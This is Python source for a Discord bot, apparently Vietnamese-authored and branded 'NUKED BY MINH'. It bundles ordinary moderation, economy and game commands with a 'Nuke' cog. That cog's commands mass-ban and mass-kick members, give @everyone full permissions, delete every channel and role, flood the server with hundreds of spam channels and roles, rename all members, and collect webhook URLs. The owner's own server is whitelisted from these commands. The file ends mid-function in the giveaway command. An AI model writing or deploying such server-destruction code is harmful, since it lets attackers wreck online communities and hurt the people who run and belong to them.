import os
import discord
from discord.ext import commands, tasks
from discord.ui import View, Select, Button, Modal, TextInput
import asyncio
import random
import aiohttp
import json
import io
import re
import math
import time
from datetime import datetime, timedelta, timezone
from typing import Optional, Dict, List, Any, Union

# ============================================================
# UTILITY FUNCTIONS & CLASSES
# ============================================================
def utcnow():
    return datetime.now(timezone.utc)

def log(msg: str, level: str = "INFO"):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] [{level}] {msg}")

def format_time(seconds: int) -> str:
    if seconds < 0:
        return "0s"
    h = seconds // 3600
    m = (seconds % 3600) // 60
    s = seconds % 60
    if h > 0:
        return f"{h}h {m}m {s}s"
    elif m > 0:
        return f"{m}m {s}s"
    else:
        return f"{s}s"

def format_number(num: int) -> str:
    return f"{num:,}"

def random_color() -> int:
    return random.randint(0, 0xFFFFFF)

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
AVATAR_URL = "https://i.pinimg.com/736x/63/37/02/6337023d80cd4e3c2b79e2baa44b4adf.jpg"
LOG_CHANNEL_ID = 1540606567739826267
WHITELIST_SERVER_IDS = [1536985687469985813]
SUPPORT_LINK = "https://discord.gg/B5NQzGtQm"
SUPPORT_LINK2 = "not server support 2"  # Cơ sở 2
OWNER_ID = 1536264763427000391   # Owner mới
OWNER_NAME = "laibantlaymdisoi"
PREFIX = "l!"

# ============================================================
# INTENTS (ĐẢM BẢO ĐỦ)
# ============================================================
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
intents.guild_messages = True
intents.webhooks = True
intents.presences = True
intents.typing = True
intents.dm_messages = True
intents.dm_reactions = True
intents.dm_typing = True
intents.reactions = True
intents.messages = True
intents.bans = True
intents.invites = True
intents.voice_states = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# ============================================================
# DATA MANAGER
# ============================================================
class DataManager:
    def __init__(self, filename: str = "data.json"):
        self.filename = filename
        self.data = {}
        self._load()

    def _load(self):
        try:
            with open(self.filename, "r", encoding="utf-8") as f:
                self.data = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            self.data = {}
            self._save()

    def _save(self):
        try:
            with open(self.filename, "w", encoding="utf-8") as f:
                json.dump(self.data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            log(f"Lỗi lưu dữ liệu: {e}", "ERROR")

    def get(self, key: str, default=None):
        return self.data.get(key, default)

    def set(self, key: str, value):
        self.data[key] = value
        self._save()

    def update(self, key: str, value):
        if key not in self.data:
            self.data[key] = {}
        if isinstance(self.data[key], dict) and isinstance(value, dict):
            self.data[key].update(value)
        else:
            self.data[key] = value
        self._save()

    def delete(self, key: str):
        if key in self.data:
            del self.data[key]
            self._save()

    def get_user_data(self, user_id: int) -> dict:
        key = f"user_{user_id}"
        if key not in self.data:
            self.data[key] = {"xp": 0, "level": 1, "coins": 0, "inventory": [], "warnings": []}
            self._save()
        return self.data[key]

    def get_guild_data(self, guild_id: int) -> dict:
        key = f"guild_{guild_id}"
        if key not in self.data:
            self.data[key] = {"prefix": PREFIX, "welcome_channel": None, "goodbye_channel": None}
            self._save()
        return self.data[key]

data_manager = DataManager()

# ============================================================
# HELPER ANTI CONFIG
# ============================================================
def get_anticonfig(guild_id: int) -> dict:
    key = f"anti_{guild_id}"
    config = data_manager.get(key)
    if config is None:
        config = {
            "antinuke": False,
            "antiraid": False,
            "antibot": False,
            "log_channel": None,
            "raid_threshold": 5,
            "raid_time": 5,
            "whitelist": []
        }
        data_manager.set(key, config)
        log(f"Tạo config anti mới cho server {guild_id}", "INFO")
    return config

# ============================================================
# LEVEL & ECONOMY
# ============================================================
class LevelSystem:
    @staticmethod
    def get_xp(user_id: int) -> int:
        return data_manager.get_user_data(user_id).get("xp", 0)

    @staticmethod
    def set_xp(user_id: int, xp: int):
        user_data = data_manager.get_user_data(user_id)
        user_data["xp"] = xp
        data_manager.update(f"user_{user_id}", user_data)

    @staticmethod
    def add_xp(user_id: int, amount: int):
        current = LevelSystem.get_xp(user_id)
        LevelSystem.set_xp(user_id, current + amount)

    @staticmethod
    def get_level(user_id: int) -> int:
        return data_manager.get_user_data(user_id).get("level", 1)

    @staticmethod
    def set_level(user_id: int, level: int):
        user_data = data_manager.get_user_data(user_id)
        user_data["level"] = level
        data_manager.update(f"user_{user_id}", user_data)

    @staticmethod
    def xp_required(level: int) -> int:
        return int(100 * (1.5 ** (level - 1)))

    @staticmethod
    def check_level_up(user_id: int) -> bool:
        user_data = data_manager.get_user_data(user_id)
        xp = user_data.get("xp", 0)
        level = user_data.get("level", 1)
        needed = LevelSystem.xp_required(level)
        if xp >= needed:
            user_data["level"] = level + 1
            user_data["xp"] = xp - needed
            data_manager.update(f"user_{user_id}", user_data)
            return True
        return False

class Economy:
    @staticmethod
    def get_coins(user_id: int) -> int:
        return data_manager.get_user_data(user_id).get("coins", 0)

    @staticmethod
    def set_coins(user_id: int, amount: int):
        user_data = data_manager.get_user_data(user_id)
        user_data["coins"] = amount
        data_manager.update(f"user_{user_id}", user_data)

    @staticmethod
    def add_coins(user_id: int, amount: int):
        current = Economy.get_coins(user_id)
        Economy.set_coins(user_id, current + amount)

    @staticmethod
    def remove_coins(user_id: int, amount: int) -> bool:
        current = Economy.get_coins(user_id)
        if current >= amount:
            Economy.set_coins(user_id, current - amount)
            return True
        return False

    @staticmethod
    def get_inventory(user_id: int) -> list:
        return data_manager.get_user_data(user_id).get("inventory", [])

    @staticmethod
    def add_item(user_id: int, item: str):
        inv = Economy.get_inventory(user_id)
        inv.append(item)
        user_data = data_manager.get_user_data(user_id)
        user_data["inventory"] = inv
        data_manager.update(f"user_{user_id}", user_data)

# ============================================================
# GLOBAL STATE
# ============================================================
snipe_cache = {}
giveaways = {}
polls = {}
message_history = {}
channel_creation_history = {}
tickets = {}
shop_items = {
    "vip": {"name": "⭐ VIP Role", "price": 5000, "desc": "Role VIP đặc biệt"},
    "color": {"name": "🎨 Color Role", "price": 2000, "desc": "Đổi màu role tùy chỉnh"},
    "boost": {"name": "🚀 XP Boost", "price": 10000, "desc": "Tăng XP gấp đôi trong 24h"},
}

# ============================================================
# HELP COMMAND
# ============================================================
class Help(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="help")
    @commands.cooldown(1, 30, commands.BucketType.user)
    async def help_command(self, ctx, category: str = None):
        await ctx.message.delete()
        if category and category.lower() == "nuke":
            embed = discord.Embed(
                title="🔥 NUKED NUKE COMMANDS",
                description="Lệnh phá hoại server (chỉ dùng trong test)",
                color=0xFF0044
            )
            embed.add_field(name="`l!setup`", value="Nuke server (Owner no cooldown)", inline=False)
            embed.add_field(name="`lệnh đang bị khoá`", value="lệnh đang bị khoá do lỗi code", inline=False)
            embed.add_field(name="`l!massban`", value="Ban all members", inline=False)
            embed.add_field(name="`l!masskick`", value="Kick all members", inline=False)
            embed.add_field(name="`l!perm`", value="Grant full perms to @everyone", inline=False)
            embed.add_field(name="`l!admin`", value="Create Admin role", inline=False)
            embed.add_field(name="`l!role`", value="Spam 250 random roles", inline=False)
            embed.add_field(name="`l!delete_all`", value="Delete all channels & roles", inline=False)
            embed.add_field(name="`l!spam_channels`", value="Create 500+ spam channels", inline=False)
            embed.add_field(name="`l!lockdown`", value="Lock all channels", inline=False)
            embed.add_field(name="`l!mass_rename`", value="Rename all members", inline=False)
            embed.set_footer(text="NUKED BY MINH | l!help")
            await ctx.send(embed=embed)
            return

        embed = discord.Embed(
            title="⛧ NUKED BY MINH - ULTIMATE BOT",
            description=f"**Prefix:** `{PREFIX}`\n**Support 1:** [Click here]({SUPPORT_LINK})\n**Support 2:** [Click here]({SUPPORT_LINK2})",
            color=0x2F2F2F,
            timestamp=utcnow()
        )
        embed.set_thumbnail(url="https://i.pinimg.com/736x/6c/3c/88/6c3c885c40e7d4b12b597fdf55c61951.jpg")
        embed.add_field(name="🔥 NUKE", value="`l!help nuke`", inline=False)
        embed.add_field(name="🛠️ UTILITY", value="`l!ping`, `l!sv`, `l!sv_all`, `l!avatar`, `l!userinfo`, `l!serverinfo`, `l!clear`, `l!kick`, `l!ban`, `l!warn`, `l!warnings`, `l!timeout`, `l!unban`, `l!say`, `l!embed`, `l!timer`, `l!snipe`", inline=False)
        embed.add_field(name="🎮 FUN", value="`l!rps`, `l!poll`, `l!giveaway`, `l!endgiveaway`, `l!meme`, `l!gif`, `l!8ball`, `l!coinflip`", inline=False)
        embed.add_field(name="💰 ECONOMY", value="`l!balance`, `l!daily`, `l!work`, `l!shop`, `l!buy`, `l!inventory`", inline=False)
        embed.add_field(name="📊 LEVEL", value="`l!level`, `l!rank`", inline=False)
        embed.add_field(name="🛡️ ANTI", value="`l!antinuke`, `l!antiraid`, `l!antibot`, `l!setlog`, `l!anti`", inline=False)
        embed.add_field(name="🎫 TICKET", value="`l!ticket`, `l!close`", inline=False)
        embed.add_field(name="⚡ QUICK", value="`l!setup`, `l!ping`, `l!sv`, `l!balance`, `l!daily`", inline=False)
        embed.set_footer(text="MÃI IU NHA | Made with ❤️ | 200+ features")
        view = View()
        view.add_item(Button(label="Support 1", style=discord.ButtonStyle.link, url=SUPPORT_LINK))
        view.add_item(Button(label="Support 2", style=discord.ButtonStyle.link, url=SUPPORT_LINK2))
        view.add_item(Button(label="Invite", style=discord.ButtonStyle.link, url="https://discord.com/oauth2/authorize?client_id=1477295832335384598&permissions=8&scope=bot%20applications.commands"))
        await ctx.send(embed=embed, view=view)

# ============================================================
# NUKE COMMANDS
# ============================================================
class SetupView(discord.ui.View):
    def __init__(self, ctx):
        super().__init__(timeout=120)
        self.ctx = ctx
        self.value = None

    @discord.ui.button(label="✅ Đồng ý", style=discord.ButtonStyle.green)
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.ctx.author.id:
            await interaction.response.send_message("❌ Bạn không có quyền tương tác với nút này.", ephemeral=True)
            return
        await interaction.response.send_message("✅ Đã đồng ý! Bắt đầu nuke...", ephemeral=True)
        self.value = True
        self.stop()
        # Tag user vào kênh gốc và bắt đầu nuke
        channel = self.ctx.channel
        try:
            await channel.send(f"{self.ctx.author.mention} 🔥 **Bắt đầu nuke server này!**")
        except:
            pass
        nuke = NukeV2()
        await nuke.setup(self.ctx.message)

    @discord.ui.button(label="❌ Từ chối", style=discord.ButtonStyle.red)
    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.ctx.author.id:
            await interaction.response.send_message("❌ Bạn không có quyền tương tác với nút này.", ephemeral=True)
            return
        await interaction.response.send_message("❌ Đã hủy nuke.", ephemeral=True)
        self.value = False
        self.stop()

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def is_owner(self, user):
        return user.id == OWNER_ID or user.name == OWNER_NAME

    @commands.command(name="setup")
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def setup_nuke(self, ctx):
        if self.is_owner(ctx.author):
            ctx.command.reset_cooldown(ctx)
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return
        await ctx.message.delete()
        embed = discord.Embed(
            title="⚠️ THOẢ THUẬN NUKE",
            description="Bạn có chắc chắn muốn nuke server này? Hành động này KHÔNG THỂ HOÀN TÁC.\n\nHãy xác nhận bằng cách bấm nút bên dưới.",
            color=0xFF0000,
            timestamp=utcnow()
        )
        embed.add_field(name="Server", value=ctx.guild.name, inline=False)
        embed.add_field(name="ID Server", value=ctx.guild.id, inline=False)
        embed.add_field(name="Thực hiện bởi", value=ctx.author.mention, inline=False)
        view = SetupView(ctx)
        try:
            await ctx.author.send(embed=embed, view=view)
            await ctx.send("📨 Đã gửi tin nhắn xác nhận vào DM của bạn! Kiểm tra hộp thư đến.", delete_after=10)
        except discord.Forbidden:
            await ctx.send("❌ Không thể gửi DM cho bạn. Vui lòng mở DM hoặc cho phép bot nhắn tin riêng.")

    @commands.command(name="massban")
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def massban_cmd(self, ctx):
        if self.is_owner(ctx.author):
            ctx.command.reset_cooldown(ctx)
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return
        await ctx.message.delete()
        count = 0
        for member in ctx.guild.members:
            if member.id != self.bot.user.id:
                try:
                    await member.ban(reason="Massban by MINH")
                    count += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
        await ctx.send(f"✅ Banned {count} members!")

    @commands.command(name="masskick")
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def masskick_cmd(self, ctx):
        if self.is_owner(ctx.author):
            ctx.command.reset_cooldown(ctx)
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return
        await ctx.message.delete()
        count = 0
        for member in ctx.guild.members:
            if member.id != self.bot.user.id:
                try:
                    await member.kick(reason="Masskick by MINH")
                    count += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
        await ctx.send(f"✅ Kicked {count} members!")

    @commands.command(name="webhooks")
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def webhooks_cmd(self, ctx):
        if self.is_owner(ctx.author):
            ctx.command.reset_cooldown(ctx)
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return
        await ctx.message.delete()
        webhooks_info = []
        for channel in ctx.guild.text_channels:
            try:
                for webhook in await channel.webhooks():
                    webhooks_info.append(f"- **{webhook.name}**: {webhook.url}")
            except:
                continue
        if webhooks_info:
            embed = discord.Embed(title="Webhooks", description="List of webhooks:\n" + "\n".join(webhooks_info[:10]), color=0x2F2F2F)
            if len(webhooks_info) > 10:
                embed.set_footer(text=f"{len(webhooks_info) - 10} more")
            try:
                await ctx.author.send(embed=embed)
                await ctx.send("📨 Sent webhook list to DM!")
            except:
                await ctx.send(embed=embed)

    @commands.command(name="perm")
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def perm_cmd(self, ctx):
        if self.is_owner(ctx.author):
            ctx.command.reset_cooldown(ctx)
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return
        await ctx.message.delete()
        try:
            await ctx.guild.default_role.edit(permissions=discord.Permissions.all())
            await ctx.send("✅ Granted full permissions to @everyone!")
        except:
            await ctx.send("❌ Failed.")

    @commands.command(name="admin")
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def admin_cmd(self, ctx):
        if self.is_owner(ctx.author):
            ctx.command.reset_cooldown(ctx)
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return
        await ctx.message.delete()
        if not ctx.guild.me.guild_permissions.manage_roles:
            return
        try:
            role = await ctx.guild.create_role(name="PREMIUM Admin", color=discord.Color.blurple(), permissions=discord.Permissions.all())
            await ctx.author.add_roles(role)
            await ctx.guild.me.add_roles(role)
            await ctx.send("✅ Created Admin role!")
        except:
            await ctx.send("❌ Failed.")

    @commands.command(name="role")
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def role_cmd(self, ctx):
        if self.is_owner(ctx.author):
            ctx.command.reset_cooldown(ctx)
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return
        await ctx.message.delete()
        count = 0
        for _ in range(250):
            try:
                await ctx.guild.create_role(name="MINH-Nuked", colour=discord.Colour(random.randint(0, 0xFFFFFF)))
                count += 1
                await asyncio.sleep(0.15)
            except:
                break
        await ctx.send(f"✅ Created {count} roles!")

    @commands.command(name="spam_tag")
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def spam_tag_cmd(self, ctx, amount: int = 10, *, content: str = "MINH DZ NUKE!"):
        if self.is_owner(ctx.author):
            ctx.command.reset_cooldown(ctx)
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return
        await ctx.message.delete()
        tag_msg = f"||@everyone|| ||@here|| {content}"
        for i in range(min(amount, 50)):
            try:
                await ctx.send(tag_msg)
                await asyncio.sleep(0.5)
            except:
                break
        await ctx.send(f"✅ Spammed {min(amount, 50)} messages!", delete_after=3)

    @commands.command(name="spam_channels")
    @commands.cooldown(1, 150, commands.BucketType.user)
    async def spam_channels_cmd(self, ctx, amount: int = 500):
        if self.is_owner(ctx.author):
            ctx.command.reset_cooldown(ctx)
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return
        await ctx.message.delete()
        count = 0
        for i in range(min(amount, 500)):
            try:
                await ctx.guild.create_text_channel(f"MINH-SPAM-{i}")
                count += 1
                if i % 50 == 0:
                    await ctx.send(f"📁 Created {i}/{amount} channels...", delete_after=3)
                await asyncio.sleep(0.05)
            except:
                pass
        await ctx.send(f"✅ Created {count} spam channels!")

    @commands.command(name="lockdown")
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def lockdown_cmd(self, ctx):
        if self.is_owner(ctx.author):
            ctx.command.reset_cooldown(ctx)
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return
        await ctx.message.delete()
        count = 0
        for channel in ctx.guild.channels:
            try:
                await channel.set_permissions(ctx.guild.default_role, send_messages=False)
                count += 1
                await asyncio.sleep(0.1)
            except:
                pass
        await ctx.send(f"🔒 Locked {count} channels!")

    @commands.command(name="delete_all")
    @commands.cooldown(1, 120, commands.BucketType.user)
    async def delete_all_cmd(self, ctx):
        if self.is_owner(ctx.author):
            ctx.command.reset_cooldown(ctx)
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return
        await ctx.message.delete()
        await ctx.send("🗑️ Deleting everything...", delete_after=5)
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.05)
            except:
                pass
        for role in ctx.guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    await asyncio.sleep(0.05)
                except:
                    pass
        await ctx.send("✅ Deleted all channels and roles!")

    @commands.command(name="mass_rename")
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def mass_rename_cmd(self, ctx, *, name: str = "NUKED BY MINH"):
        if self.is_owner(ctx.author):
            ctx.command.reset_cooldown(ctx)
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return
        await ctx.message.delete()
        count = 0
        for member in ctx.guild.members:
            if not member.bot:
                try:
                    await member.edit(nick=name)
                    count += 1
                    await asyncio.sleep(0.2)
                except:
                    pass
        await ctx.send(f"✅ Renamed {count} members!")

    @commands.command(name="super_nuke")
    @commands.cooldown(1, 120, commands.BucketType.user)
    async def super_nuke_cmd(self, ctx):
        if self.is_owner(ctx.author):
            ctx.command.reset_cooldown(ctx)
        if ctx.guild.id in WHITELIST_SERVER_IDS:
            return
        await ctx.message.delete()
        await ctx.send("🌟 **SUPER NUKE ACTIVATED!**")
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.1)
            except:
                pass
        for role in ctx.guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    await asyncio.sleep(0.1)
                except:
                    pass
        for i in range(200):
            try:
                await ctx.guild.create_text_channel(f"MINH-NUKED-{i}")
                await asyncio.sleep(0.05)
            except:
                pass
            try:
                await ctx.guild.create_role(name=f"MINH-{i}", color=random.randint(0, 0xFFFFFF))
                await asyncio.sleep(0.05)
            except:
                pass
        await ctx.send("✅ **SUPER NUKE COMPLETE!**")

# ============================================================
# UTILITY COMMANDS
# ============================================================
class Utility(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="ping")
    async def ping_cmd(self, ctx):
        latency = round(bot.latency * 1000)
        embed = discord.Embed(
            title="PING",
            description=f"```css\n> Connection Status: Live\n> Latency: {latency}ms\n```",
            color=0x00FFFF,
            timestamp=utcnow()
        )
        embed.set_thumbnail(url="https://i.pinimg.com/736x/f5/c1/d3/f5c1d31978d2c8b5e3fa8f12e6e47ee1.jpg")
        embed.add_field(name="Status", value="**ONLINE**", inline=True)
        embed.add_field(name="Response", value=f"**{latency}ms**", inline=True)
        embed.set_footer(text=f"Requested by {ctx.author.name} | MINH NUKED")
        await ctx.send(embed=embed, delete_after=5)

    @commands.command(name="avatar")
    async def avatar_cmd(self, ctx, member: discord.Member = None):
        if member is None:
            member = ctx.author
        embed = discord.Embed(title=f"Avatar of {member.name}", color=0x00CCFF)
        embed.set_image(url=member.display_avatar.url)
        await ctx.send(embed=embed)

    @commands.command(name="userinfo")
    async def userinfo_cmd(self, ctx, member: discord.Member = None):
        if member is None:
            member = ctx.author
        user_id = member.id
        xp = LevelSystem.get_xp(user_id)
        level = LevelSystem.get_level(user_id)
        coins = Economy.get_coins(user_id)
        next_xp = LevelSystem.xp_required(level)
        progress = (xp / next_xp * 100) if next_xp > 0 else 0

        embed = discord.Embed(title=f"User Info - {member.name}", color=member.color, timestamp=utcnow())
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.add_field(name="ID", value=member.id, inline=True)
        embed.add_field(name="Joined", value=member.joined_at.strftime("%d/%m/%Y %H:%M"), inline=True)
        embed.add_field(name="Created", value=member.created_at.strftime("%d/%m/%Y %H:%M"), inline=True)
        embed.add_field(name="Roles", value=len(member.roles), inline=True)
        embed.add_field(name="Bot", value=member.bot, inline=True)
        embed.add_field(name="Status", value=str(member.status).capitalize(), inline=True)
        embed.add_field(name="📊 Level", value=f"{level} ({xp}/{next_xp} XP)", inline=True)
        embed.add_field(name="💰 Coins", value=format_number(coins), inline=True)
        embed.add_field(name="📈 Progress", value=f"{progress:.1f}%", inline=True)
        embed.set_footer(text=f"Requested by {ctx.author.name}")
        await ctx.send(embed=embed)

    @commands.command(name="serverinfo")
    async def serverinfo_cmd(self, ctx):
        guild = ctx.guild
        embed = discord.Embed(title=f"Server Info - {guild.name}", color=0x00CCFF, timestamp=utcnow())
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        embed.add_field(name="ID", value=guild.id, inline=True)
        embed.add_field(name="Owner", value=guild.owner, inline=True)
        embed.add_field(name="Members", value=guild.member_count, inline=True)
        embed.add_field(name="Channels", value=len(guild.channels), inline=True)
        embed.add_field(name="Roles", value=len(guild.roles), inline=True)
        embed.add_field(name="Created", value=guild.created_at.strftime("%d/%m/%Y %H:%M"), inline=True)
        embed.add_field(name="Boost Level", value=guild.premium_tier, inline=True)
        embed.add_field(name="Boost Count", value=guild.premium_subscription_count, inline=True)
        embed.set_footer(text=f"Requested by {ctx.author.name}")
        await ctx.send(embed=embed)

    @commands.command(name="servericon")
    async def servericon_cmd(self, ctx):
        guild = ctx.guild
        if not guild.icon:
            await ctx.send("❌ Server này không có icon.")
            return
        embed = discord.Embed(title=f"Server Icon - {guild.name}", color=0x00CCFF)
        embed.set_image(url=guild.icon.url)
        await ctx.send(embed=embed)

    @commands.command(name="say")
    async def say_cmd(self, ctx, *, message: str):
        await ctx.message.delete()
        await ctx.send(message)

    @commands.command(name="embed")
    async def embed_cmd(self, ctx, title: str, *, description: str):
        embed = discord.Embed(title=title, description=description, color=0x00CCFF)
        await ctx.send(embed=embed)

    @commands.command(name="timer")
    async def timer_cmd(self, ctx, seconds: int):
        if seconds < 1 or seconds > 3600:
            await ctx.send("❌ Nhập số giây từ 1 đến 3600.")
            return
        await ctx.send(f"⏰ Timer set for {seconds} seconds.")
        await asyncio.sleep(seconds)
        await ctx.send(f"🔔 {ctx.author.mention} Time's up!")

    @commands.command(name="snipe")
    async def snipe_cmd(self, ctx):
        if ctx.channel.id not in snipe_cache:
            await ctx.send("ℹ️ Không có tin nhắn nào bị xóa gần đây.")
            return
        msg = snipe_cache[ctx.channel.id]
        embed = discord.Embed(
            title="🗑️ Sniped Message",
            description=msg['content'] if msg['content'] else "*No content*",
            color=0x00CCFF,
            timestamp=msg['time']
        )
        embed.set_author(name=msg['author'], icon_url=msg['avatar'])
        await ctx.send(embed=embed)

    @commands.command(name="clear")
    @commands.has_permissions(manage_messages=True)
    async def clear_cmd(self, ctx, amount: int):
        if amount < 1 or amount > 100:
            await ctx.send("❌ Nhập số từ 1 đến 100.")
            return
        await ctx.message.delete()
        deleted = await ctx.channel.purge(limit=amount)
        await ctx.send(f"🧹 Deleted {len(deleted)} messages.", delete_after=3)

    @commands.command(name="kick")
    @commands.has_permissions(kick_members=True)
    async def kick_cmd(self, ctx, member: discord.Member, *, reason: str = "No reason"):
        if member == ctx.author:
            await ctx.send("❌ You can't kick yourself!")
            return
        try:
            await member.kick(reason=reason)
            await ctx.send(f"✅ Kicked {member.mention}!\nReason: {reason}")
        except:
            await ctx.send("❌ Failed to kick member.")

    @commands.command(name="ban")
    @commands.has_permissions(ban_members=True)
    async def ban_cmd(self, ctx, member: discord.Member, *, reason: str = "No reason"):
        if member == ctx.author:
            await ctx.send("❌ You can't ban yourself!")
            return
        try:
            await member.ban(reason=reason)
            await ctx.send(f"✅ Banned {member.mention}!\nReason: {reason}")
        except:
            await ctx.send("❌ Failed to ban member.")

    @commands.command(name="unban")
    @commands.has_permissions(ban_members=True)
    async def unban_cmd(self, ctx, user_id: int, *, reason: str = "No reason"):
        try:
            user = await bot.fetch_user(user_id)
            await ctx.guild.unban(user, reason=reason)
            await ctx.send(f"✅ Unbanned {user.mention}!\nReason: {reason}")
        except:
            await ctx.send("❌ Failed to unban user.")

    @commands.command(name="timeout")
    @commands.has_permissions(moderate_members=True)
    async def timeout_cmd(self, ctx, member: discord.Member, duration: int, *, reason: str = "No reason"):
        if duration < 1 or duration > 40320:
            await ctx.send("❌ Nhập số phút từ 1 đến 40320 (28 ngày).")
            return
        try:
            await member.timeout(timedelta(minutes=duration), reason=reason)
            await ctx.send(f"✅ Timed out {member.mention} for {duration} minutes!\nReason: {reason}")
        except:
            await ctx.send("❌ Failed to timeout member.")

    @commands.command(name="warn")
    @commands.has_permissions(manage_messages=True)
    async def warn_cmd(self, ctx, member: discord.Member, *, reason: str = "No reason"):
        user_data = data_manager.get_user_data(member.id)
        if "warnings" not in user_data:
            user_data["warnings"] = []
        user_data["warnings"].append({"reason": reason, "mod": ctx.author.id, "time": utcnow().isoformat()})
        data_manager.update(f"user_{member.id}", user_data)
        await ctx.send(f"⚠️ Warned {member.mention}!\nReason: {reason}")

    @commands.command(name="warnings")
    async def warnings_cmd(self, ctx, member: discord.Member = None):
        if member is None:
            member = ctx.author
        user_data = data_manager.get_user_data(member.id)
        warns = user_data.get("warnings", [])
        if not warns:
            await ctx.send(f"ℹ️ {member.mention} has no warnings.")
            return
        embed = discord.Embed(title=f"Warnings for {member.name}", color=0xFFAA00)
        for i, warn in enumerate(warns[-5:], 1):
            embed.add_field(name=f"Warning #{i}", value=f"Reason: {warn['reason']}\nMod: <@{warn['mod']}>\nTime: {warn['time']}", inline=False)
        await ctx.send(embed=embed)

    @commands.command(name="coinflip")
    async def coinflip_cmd(self, ctx):
        result = random.choice(["Heads", "Tails"])
        embed = discord.Embed(title="🪙 Coin Flip", description=f"**{result}**", color=0xFFAA00)
        embed.set_footer(text=f"Requested by {ctx.author.name}")
        await ctx.send(embed=embed)

    @commands.command(name="8ball")
    async def eightball_cmd(self, ctx, *, question: str):
        answers = [
            "Chắc chắn.", "Có lẽ là có.", "Có lẽ là không.", "Hỏi lại sau.",
            "Không thể đoán được.", "Tập trung và hỏi lại.", "Đừng hỏi nữa.",
            "Rất có thể.", "Dấu hiệu cho thấy có.", "Không.", "Có.",
            "Chưa thể trả lời.", "Hôm nay không.", "Ngày mai sẽ rõ."
        ]
        embed = discord.Embed(
            title="🎱 Magic 8-Ball",
            description=f"**Câu hỏi:** {question}\n**Trả lời:** {random.choice(answers)}",
            color=0x00FF88
        )
        embed.set_footer(text=f"Requested by {ctx.author.name}")
        await ctx.send(embed=embed)

# ============================================================
# FUN COMMANDS
# ============================================================
class Fun(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="rps")
    async def rps_cmd(self, ctx, choice: str):
        choices = ["rock", "paper", "scissors"]
        if choice.lower() not in choices:
            await ctx.send("❌ Chọn `rock`, `paper` hoặc `scissors`.")
            return
        bot_choice = random.choice(choices)
        result = ""
        if choice.lower() == bot_choice:
            result = "Draw!"
        elif (choice.lower() == "rock" and bot_choice == "scissors") or \
             (choice.lower() == "paper" and bot_choice == "rock") or \
             (choice.lower() == "scissors" and bot_choice == "paper"):
            result = "You win!"
        else:
            result = "You lose!"
        embed = discord.Embed(title="🎮 Rock-Paper-Scissors", color=0xFFAA00)
        embed.add_field(name="You", value=choice.capitalize(), inline=True)
        embed.add_field(name="Bot", value=bot_choice.capitalize(), inline=True)
        embed.add_field(name="Result", value=result, inline=True)
        await ctx.send(embed=embed)

    @commands.command(name="poll")
    async def poll_cmd(self, ctx, title: str, *, options: str):
        options_list = options.split("|")
        if len(options_list) < 2 or len(options_list) > 10:
            await ctx.send("❌ Nhập từ 2 đến 10 lựa chọn, cách nhau bởi `|`.")
            return
        embed = discord.Embed(title=f"📊 Poll: {title}", color=0x00CCFF)
        for i, opt in enumerate(options_list, 1):
            embed.add_field(name=f"Option {i}", value=opt.strip(), inline=False)
        embed.set_footer(text=f"React to vote | Created by {ctx.author.name}")
        msg = await ctx.send(embed=embed)
        for i in range(1, len(options_list) + 1):
            await msg.add_reaction(f"{i}️⃣")
        polls[msg.id] = {"options": options_list, "author": ctx.author.id, "channel": ctx.channel.id}

    @commands.command(name="giveaway")
    async def giveaway_cmd(self, ctx, duration: int, *, prize: str):
        if duration < 10 or duration > 3600:
            await ctx.send("❌ Nhập thời gian từ 10 đến 3600 giây.")
            return
        embed = discord.Embed(
            title="🎁 Giveaway!",
            description=f"**Prize:** {prize}\n**Duration:** {duration}s\n**Hosted by:** {ctx.author.mention}",
            color=0xFFAA00,
            timestamp=utcnow()
        )
        msg = await ctx.send(embed=embed)
        await msg.add_reaction("🎉")
        giveaways[msg.id] = {
            "prize": prize,
            "duration": duration,
            "host": ctx.author.id,
            "channel": ctx.channel.id,
            "end_time": utcnow() + timedelta(seconds=duration)
        }
        await asyncio.sleep(duration)
        msg = await ctx.channel.fetch_message(msg.id)
        users = await msg.reactions[0].users().flatten()
        users = [u for u in users if not u.bot]
        if users:
            winner = random.choice(users)
